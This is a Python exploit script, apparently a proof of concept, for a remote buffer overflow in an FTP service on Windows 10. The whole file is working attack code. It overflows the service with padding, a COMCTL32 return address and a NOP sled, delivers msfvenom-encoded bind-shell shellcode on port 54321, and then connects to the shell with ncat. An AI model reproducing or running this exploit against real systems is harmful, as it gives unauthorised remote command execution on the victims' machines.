#!/usr/bin/python
# Using COMCTL32.exe
# Praise be to the shell!
# Based on ch3rn0byl's exploit
# Tested on Windows 10 
import socket
from sys import argv
from subprocess import call
from time import sleep
host = argv[1]
# msfvenom -p windows/shell_bind_tcp LPORT=54321 -f python -e x86/shikata_ga_nai -a x86 --platform Windows -b "\x00\x0a\x0d"
buf =  ""
buf += "\xda\xdc\xb8\xea\x9c\x7f\x92\xd9\x74\x24\xf4\x5f\x31"
buf += "\xc9\xb1\x53\x83\xc7\x04\x31\x47\x13\x03\xad\x8f\x9d"
buf += "\x67\xcd\x58\xe3\x88\x2d\x99\x84\x01\xc8\xa8\x84\x76"
buf += "\x99\x9b\x34\xfc\xcf\x17\xbe\x50\xfb\xac\xb2\x7c\x0c"
buf += "\x04\x78\x5b\x23\x95\xd1\x9f\x22\x15\x28\xcc\x84\x24"
buf += "\xe3\x01\xc5\x61\x1e\xeb\x97\x3a\x54\x5e\x07\x4e\x20"
buf += "\x63\xac\x1c\xa4\xe3\x51\xd4\xc7\xc2\xc4\x6e\x9e\xc4"
buf += "\xe7\xa3\xaa\x4c\xff\xa0\x97\x07\x74\x12\x63\x96\x5c"
buf += "\x6a\x8c\x35\xa1\x42\x7f\x47\xe6\x65\x60\x32\x1e\x96"
buf += "\x1d\x45\xe5\xe4\xf9\xc0\xfd\x4f\x89\x73\xd9\x6e\x5e"
buf += "\xe5\xaa\x7d\x2b\x61\xf4\x61\xaa\xa6\x8f\x9e\x27\x49"
buf += "\x5f\x17\x73\x6e\x7b\x73\x27\x0f\xda\xd9\x86\x30\x3c"
buf += "\x82\x77\x95\x37\x2f\x63\xa4\x1a\x38\x40\x85\xa4\xb8"
buf += "\xce\x9e\xd7\x8a\x51\x35\x7f\xa7\x1a\x93\x78\xc8\x30"
buf += "\x63\x16\x37\xbb\x94\x3f\xfc\xef\xc4\x57\xd5\x8f\x8e"
buf += "\xa7\xda\x45\x3a\xaf\x7d\x36\x59\x52\x3d\xe6\xdd\xfc"
buf += "\xd6\xec\xd1\x23\xc6\x0e\x38\x4c\x6f\xf3\xc3\xa6\x41"
buf += "\x7a\x25\x2c\xb2\x2a\xfd\xd8\x70\x09\x36\x7f\x8a\x7b"
buf += "\x6e\x17\xc3\x6d\xa9\x18\xd4\xbb\x9d\x8e\x5f\xa8\x19"
buf += "\xaf\x5f\xe5\x09\xb8\xc8\x73\xd8\x8b\x69\x83\xf1\x7b"
buf += "\x09\x16\x9e\x7b\x44\x0b\x09\x2c\x01\xfd\x40\xb8\xbf"
buf += "\xa4\xfa\xde\x3d\x30\xc4\x5a\x9a\x81\xcb\x63\x6f\xbd"
buf += "\xef\x73\xa9\x3e\xb4\x27\x65\x69\x62\x91\xc3\xc3\xc4"
buf += "\x4b\x9a\xb8\x8e\x1b\x5b\xf3\x10\x5d\x64\xde\xe6\x81"
buf += "\xd5\xb7\xbe\xbe\xda\x5f\x37\xc7\x06\xc0\xb8\x12\x83"
buf += "\xf0\xf2\x3e\xa2\x98\x5a\xab\xf6\xc4\x5c\x06\x34\xf1"
buf += "\xde\xa2\xc5\x06\xfe\xc7\xc0\x43\xb8\x34\xb9\xdc\x2d"
buf += "\x3a\x6e\xdc\x67"
payload = "A" * 2013 +  "\xdf\x6e\x88\x72" + "\x90" * 15 + buf
print "[x] Attempting to exploit {}...".format(host)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, 21))
s.recv(1024)
print "[x] Sending payload..."
s.send(payload)
s.close()
print "[*] Attempting to connect to target...\n"
try:
	sleep(1)
	call(["ncat", host, "54321"])
except:
	print "[!] Couldn't connect. Maybe exploit failed?"
